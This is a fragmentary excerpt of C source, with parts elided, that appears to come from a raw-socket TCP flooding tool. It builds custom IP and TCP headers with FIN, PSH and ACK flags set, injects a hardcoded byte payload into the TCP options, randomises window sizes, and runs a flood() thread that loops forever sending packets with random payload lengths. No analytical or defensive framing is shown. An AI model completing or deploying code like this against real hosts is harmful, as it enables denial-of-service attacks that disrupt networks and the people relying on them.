...
static const char PAYLOAD[] = "\xe0\xf7\xd0\x04\xe2\x82\xd1\x10";
...
void setup_ip_header(struct iphdr *iph)
{
        ...
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + 8;
        iph->id = htonl(54321);
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
...
void setup_tcp_header(struct tcphdr *tcph)
{
        ...
        tcph->check = 0;
        memcpy((void *)tcph + sizeof(struct tcphdr), PAYLOAD, sizeof(PAYLOAD)); // tcp options
        tcph->fin = 1;
        tcph->psh = 1;
        tcph->ack = 1;
...
int windows[5] = {8192, 14600, 29200, 64240, 65535};
...
void *flood(void *par1)
{
        ...
        while (1)
        {
                ...
                int randomPayloadLength = randnum(256, 1024);
